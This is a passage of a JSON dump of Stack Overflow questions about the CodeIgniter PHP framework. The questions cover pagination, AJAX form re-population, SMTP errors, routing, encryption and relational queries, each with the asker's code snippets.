10;   \n        $config['num_links'] = 5;    \n        $config['uri_segment'] = 2;  \n        $config['total_rows'] = $count; \n        $this-&gt;pagination-&gt;initialize($config);\n        $data['pager'] = $this-&gt;pagination-&gt;create_links();\n        $data['content'] = $this-&gt;load-&gt;view(SITE.'search', $data, true);\n        $this-&gt;load-&gt;view(SITE.'layout', $data);\n        return true;\n\n    }\n</code></pre>\n\n<p>so this is a search query, first we check if a search is \"all\", it means search by all the site, so then i make a array of keywords separated by whitespaces, entered in the form, so then i put it in a flash session for preg_match in the view, this is for preg_match highlighting text in the view of generated results, so then i make a concatenation of the query be adding more LIKE , so the problem is when i input 1 keyword, it gives me different results and its okey, but when i enter 2 or many keywords, it gives me the same results, i mean a list of result that are exact the same, i can't understand why is that, in the view its all okay, the problem is in this place of code, i have tried to set th DISTINCT keyword in the query, but it does not helped...</p>\n\n<p>ps: this is codeigniter, MVC, this is a controller, i don't use models, because i don't want to open many files :)</p>\n"},{"tags":["jquery","ajax","codeigniter","form-validation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":251,"score":0,"question_id":10893332,"title":"Using jquery.load to populate form after failed validation with ajax in codeigniter","body":"<p>I have seen a lot of form validation tutorials with jquery ajax. I found same thing that all are only telling only sucessfull form validation. I need to find how can i display errors if the server side validation fails. in other words, when we submit a form without ajax the form is re-populated with error messages And the inputs filled user provided. In this method we use some great php functions like form_prep. Here is view code.</p>\n\n<pre><code>&lt;?php // Change the css classes to suit your needs    \n$attributes = array('class' =&gt; '', 'id' =&gt; 'login');\necho form_open(SITE_URL.'user/insertUser', $attributes); \n?&gt;\n\n&lt;p&gt;\n&lt;label for=\"username\"&gt;User Name &lt;span class=\"required\"&gt;*&lt;/span&gt;&lt;/label&gt;\n&lt;input type=\"text\" name=\"username\" maxlength=\"255\" value=\"&lt;?php echo form_prep($this-&gt;input-&gt;post('username'));?&gt;\"  /&gt;\n&lt;span id=\"username\"&gt;&lt;?php echo form_error('username'); ?&gt;&lt;/span&gt;&lt;br /&gt;\n&lt;/p&gt;\n&lt;p&gt;\n&lt;label for=\"first_name\"&gt;First Name &lt;span class=\"required\"&gt;*&lt;/span&gt;&lt;/label&gt;\n&lt;input type=\"text\" name=\"first_name\" maxlength=\"255\" value=\"&lt;?php echo form_prep($this-&gt;input-&gt;post('first_name'));?&gt;\"  /&gt;\n&lt;span id=\"first_name\"&gt;&lt;?php echo form_error('first_name'); ?&gt;&lt;/span&gt;&lt;br /&gt;\n&lt;/p&gt;\n\n&lt;p&gt;\n&lt;label for=\"last_name\"&gt;Last Name &lt;span class=\"required\"&gt;*&lt;/span&gt;&lt;/label&gt;\n&lt;input type=\"text\" name=\"last_name\" maxlength=\"255\" value=\"&lt;?php echo form_prep($this-&gt;input-&gt;post('last_name')); ?&gt;\"  /&gt;\n&lt;span id=\"last_name\"&gt;&lt;?php echo form_error('last_name'); ?&gt;&lt;/span&gt;&lt;br /&gt;\n&lt;/p&gt;\n\n&lt;p&gt;\n&lt;label for=\"password\"&gt;Password &lt;span class=\"required\"&gt;*&lt;/span&gt;&lt;/label&gt;\n&lt;input type=\"text\" name=\"password\" maxlength=\"255\" value=\"&lt;?php echo form_prep($this-&gt;input-&gt;post('password')); ?&gt;\"  /&gt;\n&lt;span id = \"password\"&gt;&lt;?php echo form_error('password'); ?&gt;&lt;/span&gt;&lt;br /&gt;\n&lt;/p&gt;\n\n&lt;p&gt;\n&lt;label for=\"email\"&gt;Email &lt;span class=\"required\"&gt;*&lt;/span&gt;&lt;/label&gt;\n&lt;input type=\"text\" name=\"email\" maxlength=\"255\" value=\"&lt;?php echo form_prep($this-&gt;input-&gt;post('email')); ?&gt;\"  /&gt;\n&lt;span id = \"email\"&gt;&lt;?php echo form_error('email'); ?&gt;&lt;/span&gt;&lt;br /&gt;\n&lt;/p&gt;\n\n\n&lt;p&gt;\n&lt;?php echo form_submit( 'submit', 'Submit', 'id=\"submit\"'); ?&gt;\n&lt;/p&gt;\n\n&lt;?php echo form_close(); ?&gt;\n</code></pre>\n\n<p>You can see here used form_prep($this->input->post('username')) which is helpful for security issue. But when i use the same form to re-populate with ajax on failed validation it does not display the errors nor the input boxes filled. Instead loads the form as if this is the first time this is loaded.\nHere is how i using it with ajax.</p>\n\n<p>First in a div i am loading form</p>\n\n<pre><code>$('#userform').load('&lt;?php $this-&gt;load-&gt;view('user_form')?&gt;');\n</code></pre>\n\n<p>Now ajax</p>\n\n<pre><code>$(function()\n{\n    $('#login').submit(function()\n    {\n        $.ajax(\n        {\n            type : 'POST',\n            data : $(this).serialize(),\n            url  : $(this).attr('action'),\n            success : function(data)\n            {\n                if(data == 1)\n                {\n                    // do something \n                }\n                else\n                {\n                    $('#userform').load('&lt;?php $this-&gt;load-&gt;view('user_form')?&gt;');\n                }\n            }\n        });\n        return false;\n    });\n});\n</code></pre>\n\n<p>And finally my controller</p>\n\n<pre><code>function insertUser()\n{\n    if($this-&gt;form_validation-&gt;run() == FALSE)\n    {\n        echo 0;\n    }else{\n        echo 1;\n    }\n}\n</code></pre>\n"},{"tags":["php","iphone","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12890292,"title":"Developing iOS xcode that connects to codeigniter data","body":"<p>I have an existing web app that I have written in CodeIgniter using a MySQL database.</p>\n\n<p>I now want to learn how to develop an iPhone app for the web app.</p>\n\n<p>I have had a look at a lot of tutorials about xcode and iphone development but I have yet to see one about connecting and displaying data from my database.</p>\n\n<p>I have seen the topic of RESTful come up a few times but am unsure if this is the direction I need to go?</p>\n\n<p>If anyone has had success in building an iphone app that connects to a MySQL DB, would they be kind enough to share some tips or tuts on getting started.</p>\n"},{"tags":["jquery","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12890706,"title":"how to call a jquery function of one view in another view codeigniter","body":"<p>I have a header view which is loaded in every view. I have a jquery function in header view and want to use that jquery function in another views jquery function.</p>\n\n<p>Header view jquery function:</p>\n\n<pre><code>$('#myAccount').click( function() {\n                loadPopupBox();\n               $('.login_pop_right').fadeTo('slow',1);\n                $(\"#mdhemadd\").attr('disabled',false);\n                $(\"#mdhpass\").attr('disabled',false);\n           });\n</code></pre>\n\n<p>I want to access it another views jquery function:</p>\n\n<pre><code>    $('#shortlist').click(function(){\n    var userid = $('#userid').val();\n    var dealid = $('#dealid').val();\n    if(userid!=''){\n        $.ajax({  \n\n            type: \"POST\",\n            url:  \"/packagedetails/shortlistdeal\",\n\n            data: \"userid=\" +  userid+\"&amp;dealid=\"+dealid,\n\n            //   data: form_data,\n            success: function(data) {\n                var obj = jQuery.parseJSON(data);\n                if(obj==true)\n                {\n   loadShortlistPopupBox();\n   $('#shortlistmsg').empty();\n    var html='&lt;span class=\"messageicon\"&gt;&lt;/span&gt;&lt;p&gt;Deal shortlisted sucessfullly.&lt;/p&gt;';\n    $('#shortlistmsg').append(html);\n                  //  alert(\"Deal shortlisted sucessfullly\");\n                }\n                else\n                {\n  loadShortlistPopupBox();\n  $('#shortlistmsg').empty();\n    var html='&lt;span class=\"messageicon\"&gt;&lt;/span&gt;&lt;p&gt;This deal cannot be shortlisted.Please check your account for your &lt;a href=\"/myaccount\"&gt;shortlisted deals&lt;/a&gt;.&lt;/p&gt;';\n    $('#shortlistmsg').append(html);\n              //      alert(\"This deal cannot be shortlisted.Please check your account for your shortlisted deals.\");\n                }\n            }\n        });\n\n    }\n    else\n    {\n    alert(\"sd\");\n     $('#myAccount').click();\n    }\n});\n</code></pre>\n\n<p>How to do it?</p>\n\n<p>Thanks,</p>\n"},{"tags":["php","facebook","codeigniter"],"answer_count":2,"favorite_count":2,"up_vote_count":0,"down_vote_count":1,"view_count":110,"score":-1,"question_id":12891267,"title":"How to implement codeigniter signup with facebook signup","body":"<p>I am required to implement the functionality of registering a user onto my current website using the Facebook signup process</p>\n\n<p>Can anyone provide me with a link to some guide or blog where some help regarding this has been provided.</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12784633,"title":"Carabiner: cache path does not exist. Please set the cache path in config/carabiner.php","body":"<p>I am using code iginiter. When I try running my application from a local browser then this error is throwing up.</p>\n\n<pre><code>Carabiner: cache path does not exist. Please set the cache path in config/carabiner.php.\n</code></pre>\n\n<p>I have no clue what it is. Tried some online similar solutions  like :</p>\n\n<pre><code>http://www.webdevelopersdiary.com/1/archives/06-2012/1.html\n</code></pre>\n\n<p>but for some reason nothing seems to work. Please help me to come out of this.</p>\n"},{"tags":["php","codeigniter","control","key","unique"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12891050,"title":"PHP/SQL repeat cycle until data is unique in PHP or create SQL queries ad hoc","body":"<p>I need to generate key codes for users so i need that to be unique in db.</p>\n\n<p>I need to repeat this cycle until key is unique:</p>\n\n<pre><code>create key;\n\nif($key is not in db){\n\n  insert key;\n\n}else{\n\nrepeat control with new key;\n\n}\n</code></pre>\n\n<p>i thought about while() but can't understand how to implement that.</p>\n\n<p>Other method to insert db unique keys and update db unique key could be written in sql queries directly instead of using php script? (INSERT/UPDATE UNIQUE KEYS with Sql Query)</p>\n\n<p>hoping is clear the question.</p>\n"},{"tags":["class","codeigniter","instance"],"answer_count":3,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":2062,"score":2,"question_id":693260,"title":"How Do You Create Multiple Instances of a Library Class in CodeIgniter?","body":"<p>I'd like to create several instances of a class in CodeIgniter. I have created my class as a library, but cannot figure out the syntax to use to create more than one instance.</p>\n"},{"tags":["php","codeigniter","mysqli"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":88,"score":3,"question_id":12889696,"title":"How to insert english alphabets as incremental order","body":"<p>Hi i have the table structure as follows</p>\n\n<pre><code>id   --auto increment id\nalphabet\nuser_id\nname\n</code></pre>\n\n<p>and while adding i needs to insert the english alphabets to users as incremental order like this <code>A,B,C,....Z,AA,AB,AC,...AZ,BA,BB,BC,.....BZ</code>.</p>\n\n<p>I need to get like this</p>\n\n<pre><code>    id    alphabet  user_id   name  \n------------------------------------------\n    1      A          1       name-1\n    2      B          1       name-2\n    .      .          .         .\n    .      .          .         .\n    26     Z          1       name-n\n    27     A          2       name-1\n    28     B          2       name-2\n    .      .          .         .\n    .      .          .         .\n    52     Z          2       name-52\n    53     AA         2       name-53 \n    .      .          .         .\n    .      .          .         .\n    .      .          .         .\n    .      AZ         2         .  \n</code></pre>\n\n<p>Thanks for your time. </p>\n"},{"tags":["php","mysql","mvc","codeigniter","activerecord"],"answer_count":5,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":111,"score":0,"question_id":12889604,"title":"How to split a query result in to multi pages (pagination) and sort query data?","body":"<p>In my model I get the entire <code>order</code> table.</p>\n\n<pre><code>return $this-&gt;db-&gt;get('order')-&gt;result();\n</code></pre>\n\n<p>In my view i do a <code>foreach</code> to loop through the data. </p>\n\n<pre><code>&lt;?php foreach ($orders as $order) : ?&gt;\n&lt;tr&gt;\n   &lt;td&gt;&lt;?php echo $order-&gt;id; ?&gt;&lt;/td&gt;\n   &lt;td&gt;&lt;?php echo $order-&gt;order_status; ?&gt;&lt;/td&gt;\n   &lt;td&gt;&lt;?php echo $order-&gt;cart; ?&gt;&lt;/td&gt;\n     . . . \n&lt;?php endforeach; ?&gt;\n</code></pre>\n\n<p></p>\n\n<p>Ok so that works like a charm. However I need to be able to do some data arranging here.</p>\n\n<ol>\n<li>I want to be able to sort records by <code>id</code> so that I can get the latest on top</li>\n<li>I want to split the results (pagination) say every 25 records and add the (go to next page link)</li>\n</ol>\n\n<p>I'm using <strong>Codeigniter</strong> and building on the MVC pattern. So is their a library perhaps or built-in functions in <code>CI</code> that allow me accomplish these 2 objectives? I appreciate all helpful advice, code examples and general guidance. Thank you in advance for your time! :)</p>\n\n<p><strong>Edit 1</strong></p>\n\n<p>Sorry I didn't mention this.. Can someone give me an example of how the <code>query</code> needs to be structured <code>return $this-&gt;db-&gt;get('order', 25)-&gt;result();</code> isn't exactly giving me the desired result here.</p>\n"},{"tags":["php","codeigniter","smtp","gmail","starttls"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":114,"score":0,"question_id":12889596,"title":"Failed to send AUTH LOGIN command. Error: 530 5.7.0 Must issue a STARTTLS command first","body":"<p>I am having the following code </p>\n\n<pre><code>            ini_set(\"SMTP\",\"ssl://smtp.gmail.com\");\n            ini_set(\"smtp_port\",\"587\");\n\n            $config['protocol'] = 'smtp';\n            $config['smtp_host'] = 'smtp.gmail.com';\n            $config['smtp_port'] = '587';\n            $config['_smtp_auth']=TRUE;\n            $config['smtp_user'] = 'sender@gmail.com';\n            $config['smtp_pass'] = 'password';\n            $config['smtp_timeout'] = '60';\n            $config['charset'] = 'utf-8';\n            $config['wordwrap'] = TRUE;\n            $config['mailtype'] = \"html\";\n\n            $this-&gt;email-&gt;initialize($config);\n\n            $this-&gt;email-&gt;from('sender@gmail.com', 'Sender');\n            $this-&gt;email-&gt;to('receiver@gmail.com');\n\n            $this-&gt;email-&gt;subject('This is my subject');\n            $this-&gt;email-&gt;message('This is the content of my message');\n\n            if ( ! $this-&gt;email-&gt;send())\n            {\n                show_error($this-&gt;email-&gt;print_debugger());\n            }\n            else\n            {\n                echo('DONE');\n            }\n</code></pre>\n\n<p>But when the code executes, I am getting the following error</p>\n\n<p>Failed to send AUTH LOGIN command. Error: 530 5.7.0 Must issue a STARTTLS command first. qd9sm8462833pbb.31 </p>\n\n<p>I have used </p>\n\n<pre><code>           $this-&gt;load-&gt;library('email');\n</code></pre>\n\n<p>in my controller's constructor. But I am unable to send email from localhost. What can be the solution to send email? What changes do I need to make?</p>\n"},{"tags":["mvc","validation","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12864871,"title":"Prevent Code Repetition CodeIgniter Validation","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12485719/constructor-session-validation-for-different-functions\">Constructor session validation for different functions</a>  </p>\n</blockquote>\n\n\n\n<p><strong>Framework</strong> : CI (CodeIgniter)</p>\n\n<p><strong>Situation</strong> :</p>\n\n<p>I have 4 pages(controllers) namely:</p>\n\n<p><code>home</code>\n<code>login</code>\n<code>dashboard</code>\n<code>editprofile</code></p>\n\n<p><strong>ACCESS</strong></p>\n\n<ul>\n<li><p><strong>home</strong> can be accessed by all types of users, logged in or not</p></li>\n<li><p><strong>login</strong> must be only be access if not authenticated</p></li>\n<li><p><strong>dashboard</strong> and editprofile must only be accessed by students(authenticated users)</p></li>\n</ul>\n\n<p>I have this validatation for my controllers like this:</p>\n\n<pre><code>if($this-&gt;session-&gt;userdata('isLoggedIn')){\n    // stay here do the function\n} else {\n// leave this page\n    header('Location:'.base_url().'login');\n}\n</code></pre>\n\n<p>I have that in my <code>function index(){}</code>.</p>\n\n<p>But as I develop the system, as i create more methods, more controllers, it's becoming messier..\nfor you need to use  this</p>\n\n<pre><code>if($this-&gt;session-&gt;userdata('isLoggedIn')){\n// stay here do the function\n} else {\n// leave this page\nheader('Location:'.base_url().'login');\n}\n</code></pre>\n\n<p>everytime you have a method, </p>\n\n<p>i've read several questions in stackoverflow... and the only best answer is this: link here</p>\n\n<p>it says that i must use decorator pattern for that... but i don't clearly get how am i suppose to do that.</p>\n"},{"tags":["php","jquery","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":109,"score":1,"question_id":12888572,"title":"How to protect controller against direct access?","body":"<p>I'm using codeigniter with jquery and it would be nice if you explain me how to protect the controller from direct access.\nFor example,\nI have view with that standard jquery line: </p>\n\n<pre><code>$('#handler').load('tools/get_stats');\n</code></pre>\n\n<p>Tools it is my controller with function for loading statistics. If I write direct in browser full address of script <a href=\"http://site.com/tools/get_stats\" rel=\"nofollow\">http://site.com/tools/get_stats</a>, browser open, of course, that data.\nHow to protect direct controller access from browser ? I want my data were loaded only in view, not on controller direct access.</p>\n"},{"tags":["php","codeigniter","explode"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12887896,"title":"codeigniter explode undefined offset","body":"<p>i have models like this</p>\n\n<pre><code>  function getlastval($prefix,$namatable, $namafield)\n{\n    $this-&gt;db-&gt;order_by($namafield,'DESC');\n    $key = $this-&gt;db-&gt;get($namatable);\n\n    if($key-&gt;num_rows()&gt;0)\n    {\n\n        $lastval= $key-&gt;row()-&gt;Kode_Material_Jasa;\n        $lastval = explode($prefix,$lastval);\n        $lv = $lastval[1]; //line 18 refer to this line\n        //return ltrim($lv, '0');\n        }\n    else\n    {\n        return 0;\n    }\n}\n\nfunction gencode($prefix, $digit, $lastval)\n{\n    return $prefix . str_pad($lastval+1, $digit, '0', STR_PAD_LEFT);\n}\n</code></pre>\n\n<p>it works on the earlier controller</p>\n\n<pre><code>function addkategorimaterial()\n{\n    $this-&gt;load-&gt;model('m_admin');\n    $lastval = $this-&gt;m_admin-&gt;getlastval('KKMJ','ms_kategori_material','Kode_Kategori_Material_Jasa');\n    $data['nextval'] = $this-&gt;m_admin-&gt;gencode('KKMJ',3,$lastval); \n    $data['title'] = 'QB Tambah Kategori Material';\n    $this-&gt;load-&gt;view('head',$data);\n    $this-&gt;load-&gt;view('content/add_kategori_material');\n}\n</code></pre>\n\n<p>it returns <code>KKMJ001</code> but then its not working on the other controller</p>\n\n<pre><code>     $this-&gt;load-&gt;model('m_admin');\n$lastval = $this-&gt;m_admin-&gt;getlastval('KMJ','ms_material_jasa','Kode_Material_Jasa');\n    $data['nextval'] = $this-&gt;m_admin-&gt;gencode('KMJ',3,$lastval); \n    $data['kkmj']='';\n    $data['title'] = 'QB Tambah Material / Jasa';\n\n    print_r($data['nextval']);\n    print_r($lastval);\n</code></pre>\n\n<p>so the function would return <code>KMJ001</code> and the error goes like this </p>\n\n<p><img src=\"http://i.stack.imgur.com/BsUCh.png\" alt=\"enter image description here\"></p>\n\n<p>how do i resolve this ? </p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12888092,"title":"Return a variable in my model if the query returns true","body":"<h1>Model</h1>\n\n<pre><code>  $q = $this-&gt;db-&gt;get_where('person', array('p_id' =&gt; $p));\n  if($q-&gt;num_rows()!=1) \n    {\n    redirect('General_Area/Home');\n    exit();\n    }\n    else\n    {   \n         . . . \n</code></pre>\n\n<p>Ok So once the model is initialized it queries the db and looks for exactly one match and if found it moves on the else statement. However if not found it will <code>redirect('General_Area/Home');</code></p>\n\n<p>How do I pass a message in there? In my controller I am returning an <code>object</code> if the query is successful. </p>\n\n<p>And in my view i am <code>echo obj-&gt;table_col_name</code></p>\n\n<pre><code>  $q = $this-&gt;db-&gt;get_where('person', array('p_id' =&gt; $p));\n  if($q-&gt;num_rows()!=1) \n    {\n    return $Error = 'You have not been found!...';\n    #redirect('General_Area/Home');\n    exit();\n    }\n    else\n    {   \n         . . .  \n</code></pre>\n\n<p>If the <code>$q</code> was not successful I want to be able to <code>echo $error;</code> in the view for the user to see the message.</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":66,"score":-2,"question_id":12888113,"title":"How to handle this multiple delete functionality with check and uncheck code into codeigniter?","body":"<p>Below is a php code i made in a non codeigniter code work. It is a check all and uncheck all delete function. i’m not sure where to put this if it’s in the control model or view? can anyone please help me.</p>\n\n<pre><code>&lt;?php\n\n/*Check Box Commands*/\n$id=$row_notification['user_id'];\n\nif(isset($_POST['Delete'])) {\n$checkbox = $_POST['checkbox'];\nmysql_select_db($database_connection_ched, $connection_ched);\n$id=$row_notification['user_id'];\n\nfor($i=0;$i&lt;count($checkbox);$i++)\n  {\n$delete = \"DELETE FROM tb_user WHERE user_id=$checkbox[$i]\";\nmysql_query($delete,$connection_ched);\n\n}\n$result2 = mysql_query($delete);\n\nif($result2)\n{\necho \"[removed]alert ('Successfully Deleted');[removed]\"; \necho \"&lt;meta http-equiv=\\\"refresh\\\" content=\\\"0;URL=notification.php?\\\"&gt;\"; }\n\n}\n?&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","web-applications"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12887397,"title":"Is CodeIgniter a good library on which to build a large web service?","body":"<p>I have been using codeigniter for a few months, and have learned the ins and outs. It seems like a very solid foundation for a website, especially when using external libraries like tank auth for user registration. My question is, is this a stable flexible solution if your web service, or website were to grow exponentially? Would the frame work be able to handle it if programmed right? Or would it be safer to start from scratch. I would seem pointless to reinvent the wheel especially when codeigniter provides so many pre-coded functions and features.</p>\n\n<p>Just wondering what the best way to go about building a large scale web application would be.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12887500,"title":"Passing POST value from VIEW to CONTROLLER to MODEL in Codeigniter","body":"<p>Ok I stripped out validation and other code to make this example as transparent as possible. I am unable to <code>POST</code> a VAR to my MODEL.</p>\n\n<h1>VIEW</h1>\n\n<pre><code>&lt;?php echo form_open('invoice'); ?&gt;\n  &lt;?php echo validation_errors(); ?&gt;\n  &lt;?php echo form_input('order_num', $this-&gt;input-&gt;post('order_num')); ?&gt;\n  &lt;?php echo form_submit('submit','submit'); ?&gt;\n&lt;?php echo form_close(); ?&gt;\n</code></pre>\n\n<h1>CONTROLLER</h1>\n\n<pre><code>public function invoice()\n  {\n  $order = $this-&gt;input-&gt;post('order_num');\n  $this-&gt;General_Model-&gt;get_customer_order($order);\n  }\n</code></pre>\n\n<h1>MODEL</h1>\n\n<pre><code>function get_customer_order($order)\n  {\n    . . .\n  $this-&gt;db-&gt;where('client_orders.id', $order);\n  $result = $this-&gt;db-&gt;get('client_orders');\n    . . .\n\n  }\n</code></pre>\n\n<p>Ok Basically you enter an order number on the form. Then it goes to the controller which does the validation (i removed it here to keep example simple) and finally it passes the data to the model which runs the query on the db and returns the <code>$result</code>.</p>\n\n<p>However instead of my desired output im getting: Fatal error: Call to a member function get_customer_order() on a non-object  <strong>and</strong>  A PHP Error was encountered Severity: Notice Message: Undefined property: Account_dashboard::$General_Model </p>\n\n<p>What am I doing wrong here? Thanks for the help.</p>\n"},{"tags":["codeigniter","aes","decode","encode"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12886989,"title":"Codeigniter AES decode showing strange chars","body":"<p>i tryed:</p>\n\n<pre><code>$data = array('ip'=&gt;'120.0.3.4','user'=&gt;'robert');\n\n $this-&gt;load-&gt;library('encrypt');\n    $this-&gt;encrypt-&gt;set_cipher(MCRYPT_RIJNDAEL_256);\n    $this-&gt;encrypt-&gt;set_mode(MCRYPT_MODE_ECB);\n    $key = random_string();\n    $o=$this-&gt;encrypt-&gt;encode($data,$key);\nvar_dump($o);\n$this-&gt;encrypt-&gt;set_cipher(MCRYPT_RIJNDAEL_256);\n    $this-&gt;encrypt-&gt;set_mode(MCRYPT_MODE_ECB);\n    $o = $this-&gt;encrypt-&gt;decode($o,$key);\n    var_dump($o);\n</code></pre>\n\n<p>it retunrs strange chars in decoding:</p>\n\n<pre><code>string(44) \"CVwMzZGkzagW4wHbUZfNpVWACQp2Fx4TeAO2KLqZs3I=\" string(32) \"��pz��xJx�jʊ8�Kw��mS�Y �1�_�\" \n</code></pre>\n\n<p>any suggestion?</p>\n\n<p>is this caused from the array encryption? i need to encrypt value by value instead of encrypt all the array to use the array of encrypted data??\nthx</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12887087,"title":"How do you use codeigniter segments?","body":"<p>I'm new to codeigniter 2, and I have a question about URI segments.</p>\n\n<p>What should I do when I have a different number of segments?</p>\n\n<p>for example (pseudo code)</p>\n\n<pre><code>if(number of segments are 3){\n   do something\n}elseif(number of segmens are only 2){\n  do something else\n}\n</code></pre>\n"},{"tags":["php","mysql","query","mvc","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12886621,"title":"HOW TO DB query multi-tables relational db","body":"<h1><code>Customer table</code></h1>\n\n<pre><code>///////////////////////////////////////////////////////////\n|      id[PR]  |      name        |       email           |  \n|      10      |      fabio       |     fab@fab.com       |   \n|      11      |      james       |     james@james.com   |   \n</code></pre>\n\n<h1><code>Order table</code></h1>\n\n<pre><code>//////////////////////////////////////////////////////////////////\n|  order_id[PR]  |  ship_to[FK]  |  bill_to[FK]   | customer[FK] |  product, total, etc\n|      251       |       3       |         2      |       10     |  . . . \n</code></pre>\n\n<h1><code>Ship to table</code></h1>\n\n<pre><code>//////////////////////////////////////////////////////////////////////\n|   customer[FK]  |  ship_to[PR]  |   label   |    address           |  city, state, zip, etc\n|       10        |      3        |   office  |  123 main st         |  . . .\n|       10        |      1        |   home    |  85 some place st    |  . . .\n</code></pre>\n\n<h1><code>Bill to table</code></h1>\n\n<pre><code>///////////////////////////////////////////////////////////////////////////\n|   customer[FK]  |  bill_to[PR]  |   label   |    account                |  billing details\n|       10        |      2        |   visa    |  AES_CRYPT(temp storage)  |   . . .\n|       10        |      1        |     mc    |  AES_CRYPT(temp storage)  |   . . .\n</code></pre>\n\n<p>Ok so each customer can have multi-ship to addresses and multi-payment methods on file in their account. When they place an order the order table stores the cart and session information.</p>\n\n<p>I need to generate <code>invoices</code> how do I structure my query so that when i lookup the order table i can see the row of <code>ship to table</code> and the row of <code>bill to table</code> instead of the <code>id</code> of the row in the associated table.</p>\n\n<p>Now mind you i don't expect anyone to write my code but if you can please give me some links to read up on that would be great or an example would be awesome. Please note im building on codeigniter so im using the MVC pattern.</p>\n\n<p>? - Should all of these lookups be structured in 1 model function or should they be spread over several functions in the model?</p>\n\n<pre><code>return $this-&gt;db-&gt;get('order_table')-&gt;result();\n#this would return all the orders in the order table . \n</code></pre>\n\n<p>in my <code>view</code> i would foreach these results and make the order-id a link to more details/ invoice   page. How do i pass the values from the row to the model query to generate the proper details/invoice page?</p>\n\n<p>E.g. - So if you click on order 251, you will see a details page with an invoice that will say </p>\n\n<ol>\n<li>customer id 10</li>\n<li>name: fabio</li>\n<li>email: fab@fab.com</li>\n<li>ship to: office, 123 main st...</li>\n<li>bill to: visa, acct#, etc...</li>\n</ol>\n"},{"tags":["codeigniter","mongodb"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":195,"score":0,"question_id":8152103,"title":"MongoDB remove item from array from a selected document","body":"<p>I am developing a web app using Codeigniter and Alex Bilbies MongoDB library.\nEach user got a document that contains an item called phones which contains an array of phone numbers. How can I pull an item out of the array from the selected users document?</p>\n\n<p>Thankful for all help!</p>\n"},{"tags":[".htaccess","codeigniter","controller","routes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12884386,"title":"Codeigniter - newbie controller & routes","body":"<p>This is my first time using CI and I just walked through the tutorial. </p>\n\n<p>According to the tutorial, it is possible to handle all the requests for static pages through application/controllers/pages.php</p>\n\n<pre><code>class Pages extends CI_Controller {\n\n    public function view($page = 'home')\n    {\n        if( ! file_exists('application/views/pages/'.$page.'.php'))\n        {\n            // Whoops, we don't have a page for that!\n            show_404();\n        }\n\n        $data['title'] = ucfirst($page); // Capitalize the first letter\n\n        $this-&gt;load-&gt;view('templates/header', $data);\n        $this-&gt;load-&gt;view('templates/nav', $data);\n        $this-&gt;load-&gt;view('pages/'.$page, $data);\n        $this-&gt;load-&gt;view('templates/aside_right', $data);\n        $this-&gt;load-&gt;view('templates/bottom', $data);\n    }\n}\n</code></pre>\n\n<p>I just don't get how it works. This works for the \"home\"-page, but I don't seem to be able to call views/pages/about for example. </p>\n\n<p>I tried to make a seperate controller for the about-page. It works, but it feels somewhat wrong.</p>\n\n<p>application/controllers/about.php</p>\n\n<pre><code>class About extends CI_Controller {\n\n    public function index()\n    {\n        $this-&gt;load-&gt;view('templates/header');\n        $this-&gt;load-&gt;view('templates/nav');\n        $this-&gt;load-&gt;view('pages/about');\n        $this-&gt;load-&gt;view('templates/aside_right');\n        $this-&gt;load-&gt;view('templates/bottom');\n    }\n} \n</code></pre>\n\n<p>I also seem to have issues with my htaccess file or routes file. With the About-controller written above, I can only get to the page by typing domain.com/index.php/about. I'd like it to be domain.com/about etc.</p>\n\n<p>This is what my routes.php's like:</p>\n\n<pre><code>$route['about'] = 'about';\n$route['(:any)'] = 'pages/view/$1';\n$route['default_controller'] = 'pages/view';\n</code></pre>\n\n<p>My Htaccess: </p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\n# Hide the application and system directories by redirecting the request to index.php\nRewriteRule ^(application|system|\\.svn) index.php/$1 [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [QSA,L] \n</code></pre>\n\n<p>Glad for some hints and I'm sorry for all my mistakes!</p>\n"},{"tags":["php","function","codeigniter","methods"],"answer_count":5,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":775,"score":2,"question_id":9849984,"title":"Public function vs Function in CodeIgniter","body":"<p>Is there any difference between declaring methods inside class with </p>\n\n<p><strong>public function</strong></p>\n\n<p>VS 